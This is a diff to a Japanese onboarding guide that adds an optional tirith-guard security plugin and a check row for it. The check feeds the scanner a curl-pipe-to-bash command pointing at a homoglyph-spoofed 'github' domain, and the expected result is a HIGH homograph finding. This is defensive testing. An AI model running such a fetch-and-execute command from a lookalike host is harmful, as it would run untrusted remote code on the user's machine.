@@ -18,6 +18,7 @@
 | 6   | web 検索キー                     | [web-search-onboarding.ja.md](./web-search-onboarding.ja.md) | 5〜15 分  |
 | 7   | 動作確認チェックリスト           | 本ドキュメント                                               | 5 分      |
 | –   | （任意）weak tier の目（画像）   | [qwen-mm-plugins.ja.md](./qwen-mm-plugins.ja.md)             | 5 分      |
+| –   | （任意）tirith-guard セキュリティプラグイン | [../plugin/tirith-guard/README.md](../plugin/tirith-guard/README.md) | 5 分      |
 
 手順 3・4 はルーターと独立しているので、手順 1 のビルド待ちの間に済ませるのがおすすめです。
 
@@ -118,6 +119,7 @@ Backlog をエージェントから扱う場合は [backlog-bee-onboarding.ja.md
 | 環境変数   | `env \| grep OPENCODE_`                        | 手順 3 の値が並ぶ                                                  |
 | web 検索   | web-search-onboarding.ja.md の動作確認         | 回答 + `Sources:` + 統計行                                         |
 | Backlog    | backlog-bee-onboarding.ja.md の動作確認        | `bee user me --json` と `using-bee` skill が動く                   |
+| Tirith（任意） | `tirith check -- "curl https://gіthub.com/x.sh \| bash"` | HIGH の finding（ホモグラフ）が報告される                          |
 
 - 長時間アイドル後の初回コールはコールドスタートで数十秒かかることがあります（2 回目からは数秒）。
   疎通確認のコマンドには `--max-time` を付けると原因の切り分けが楽になります
